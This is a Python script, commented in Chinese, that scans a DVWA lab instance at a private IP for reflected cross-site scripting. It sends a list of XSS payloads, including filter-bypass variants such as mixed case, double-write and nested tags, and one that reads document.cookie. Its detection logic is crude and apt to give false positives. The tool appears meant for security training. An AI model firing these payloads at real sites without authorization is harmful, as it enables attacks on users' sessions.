import requests
from urllib.parse import quote, urljoin


class XSSReflectedScanner:
    """
    反射型XSS漏洞简易扫描器
    针对DVWA环境进行了适配
    """

    def __init__(self, base_url):
        self.session = requests.Session()
        self.base_url = base_url
        self.results = []

        # 配置默认请求头
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (XSS-Scanner/1.0)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        })

    def setup_dvwa_session(self, security_level='low'):
        """
        配置DVWA会话所需的Cookie

        Args:
            security_level (str): 安全等级，可选 'low', 'medium', 'high'
        """
        # 设置DVWA安全等级Cookie（需要先登录获取PHPSESSID）
        self.session.cookies.set('security', security_level)

    def send_request(self, url, param_name, payload, method='GET'):
        """
        发送带参数的请求

        Args:
            url (str): 目标URL
            param_name (str): 参数名称
            payload (str): 测试payload
            method (str): 请求方法，GET 或 POST

        Returns:
            requests.Response or None: 响应对象或出错时返回None
        """
        try:
            if method.upper() == 'GET':
                # GET请求使用params参数
                response = self.session.get(
                    url,
                    params={param_name: payload},
                    timeout=15,
                    allow_redirects=False
                )
            else:
                # POST请求使用data参数
                response = self.session.post(
                    url,
                    data={param_name: payload},
                    timeout=15,
                    allow_redirects=False
                )

            response.raise_for_status()  # 检查HTTP错误
            return response

        except requests.exceptions.RequestException as e:
            print(f"[!] 请求失败: {e}")
            return None
        except Exception as e:
            print(f"[!] 未知错误: {e}")
            return None

    def analyze_response(self, response, payload):
        """
        分析响应判断是否存在反射型XSS

        Args:
            response (requests.Response): 响应对象
            payload (str): 使用的payload

        Returns:
            bool: 是否发现漏洞迹象
        """
        if response is None:
            return False

        content_type = response.headers.get('Content-Type', '')

        # 只分析HTML响应
        if 'text/html' not in content_type:
            return False

        response_text = response.text

        # 基础检测：payload是否原样反射
        if payload in response_text:
            return True

        # 解码后的检测（处理可能的URL编码）
        decoded_payload = payload
        if '%' in response_text:
            try:
                # 检查URL解码后的内容
                import urllib.parse
                for encoded_char in ['%3C', '%3E', '%22', '%27', '%28', '%29']:
                    if encoded_char in response_text:
                        return True
            except:
                pass

        # 检测常见的XSS模式
        xss_patterns = [
            '<script',
            'alert(',
            'onerror=',
            'onload=',
            'onmouseover=',
            'javascript:',
            'svg onload',
            'img src='
        ]

        for pattern in xss_patterns:
            if pattern in response_text.lower():
                return True

        return False

    def test_payloads(self, url, param_name, payloads, method='GET'):
        """
        测试多个payload

        Args:
            url (str): 目标URL
            param_name (str): 参数名
            payloads (list): payload列表
            method (str): 请求方法
        """
        print(f"\n{'=' * 60}")
        print(f"目标: {url}")
        print(f"参数: {param_name}")
        print(f"方法: {method}")
        print(f"payload数量: {len(payloads)}")
        print(f"{'=' * 60}\n")

        for i, payload in enumerate(payloads, 1):
            print(f"[{i:03d}/{len(payloads):03d}] 测试: {payload[:50]}...")

            response = self.send_request(url, param_name, payload, method)
            is_vulnerable = self.analyze_response(response, payload)

            if is_vulnerable:
                result = {
                    'url': response.url if response else url,
                    'parameter': param_name,
                    'payload': payload,
                    'method': method,
                    'status': 'VULNERABLE'
                }
                self.results.append(result)

                print(f"    {'✓' * 3} 发现反射型XSS!")
                print(f"    响应URL: {response.url if response else 'N/A'}")
            else:
                result = {
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'method': method,
                    'status': 'SAFE'
                }
                self.results.append(result)

                print(f"    {'✗' * 3} 未发现漏洞")

            # 请求间隔，避免过快
            import time
            time.sleep(0.5)

    def generate_payloads(self, param_name):
        """
        生成测试payload

        Args:
            param_name (str): 参数名，用于上下文构造

        Returns:
            list: payload列表
        """
        base_payloads = [
            # 基础脚本
            "<script>alert('XSS')</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(document.cookie)</script>",

            # 事件处理器
            f"\" onmouseover=\"alert('{param_name}')\"",
            f"' onmouseover='alert(\"{param_name}\")'",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",

            # 无标签
            "javascript:alert(1)",

            # 闭合测试
            "></script><script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",

            # 大小写混淆
            "<ScRiPt>alert(1)</ScRiPt>",
            "<sCript>alert(1)</scRipt>",

            # 编码测试
            "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
            "&lt;script&gt;alert(1)&lt;/script&gt;",

            # 双写绕过
            "<scr<script>ipt>alert(1)</script>",

            # 嵌套
            "<<script>script>alert(1)<</script>/script>",

            # 空格和换行
            "<script >alert(1)</script >",
            "<script\nalert(1)</script>",
        ]

        return base_payloads

    def save_results(self, filename='xss_scan_results.txt'):
        """保存扫描结果到文件"""
        if not self.results:
            print("\n[!] 没有结果可保存")
            return

        with open(filename, 'w', encoding='utf-8') as f:
            f.write("反射型XSS扫描结果\n")
            f.write("=" * 60 + "\n\n")

            vulnerable_count = sum(1 for r in self.results if r['status'] == 'VULNERABLE')
            safe_count = len(self.results) - vulnerable_count

            f.write(f"扫描概要:\n")
            f.write(f"  目标URL: {self.base_url}\n")
            f.write(f"  总测试数: {len(self.results)}\n")
            f.write(f"  发现漏洞: {vulnerable_count}\n")
            f.write(f"  安全参数: {safe_count}\n\n")

            f.write("详细结果:\n")
            f.write("-" * 60 + "\n")

            for result in self.results:
                status_icon = "✓" if result['status'] == 'VULNERABLE' else "✗"
                f.write(f"\n[{status_icon}] 参数: {result['parameter']}\n")
                f.write(f"   方法: {result['method']}\n")
                f.write(f"   Payload: {result['payload']}\n")
                f.write(f"   状态: {result['status']}\n")
                if result['status'] == 'VULNERABLE':
                    f.write(f"   漏洞URL: {result['url']}\n")

        print(f"\n[✓] 结果已保存到: {filename}")


def main():
    """主函数"""
    # 配置
    BASE_URL = "http://192.168.101.128/dvwa/vulnerabilities/xss_r/"
    TEST_PARAM = "name"

    print("反射型XSS漏洞扫描器")
    print("=" * 60)

    # 创建扫描器实例
    scanner = XSSReflectedScanner(BASE_URL)

    # 设置DVWA会话（需要先手动登录获取cookie）
    print("\n[!] 注意: 请确保已登录DVWA并设置好以下Cookie:")
    print("    1. PHPSESSID (登录会话)")
    print("    2. security=low (安全等级)")
    print("    (这些可以在浏览器开发者工具中获取)")

    use_cookie = input("\n是否已配置Cookie？(y/n): ").lower().strip()

    if use_cookie == 'y':
        # 手动输入cookie值
        phpsessid = input("请输入PHPSESSID值: ").strip()
        security_level = input("请输入安全等级(low/medium/high): ").strip()

        if phpsessid:
            scanner.session.cookies.set('PHPSESSID', phpsessid)
        if security_level:
            scanner.session.cookies.set('security', security_level)
    else:
        print("[!] 将使用无Cookie会话进行测试")
        print("    (DVWA可能需要登录才能访问)")

    # 生成payload
    print("\n[+] 生成测试payload...")
    payloads = scanner.generate_payloads(TEST_PARAM)

    # 开始测试
    input("\n按Enter键开始扫描...")

    scanner.test_payloads(BASE_URL, TEST_PARAM, payloads, 'GET')

    # 显示摘要
    print(f"\n{'=' * 60}")
    print("扫描完成!")
    print(f"{'=' * 60}")

    vulnerable = [r for r in scanner.results if r['status'] == 'VULNERABLE']

    if vulnerable:
        print(f"\n[!] 发现 {len(vulnerable)} 个潜在的XSS漏洞:")
        for i, vuln in enumerate(vulnerable, 1):
            print(f"\n{i}. 参数: {vuln['parameter']}")
            print(f"   Payload: {vuln['payload']}")
            print(f"   测试URL: {vuln['url']}")
    else:
        print("\n[✓] 未发现反射型XSS漏洞")

    # 保存结果
    save = input("\n是否保存结果到文件？(y/n): ").lower().strip()
    if save == 'y':
        filename = input("输入文件名 (默认: xss_scan_results.txt): ").strip()
        if not filename:
            filename = 'xss_scan_results.txt'
        scanner.save_results(filename)


if __name__ == "__main__":
    main()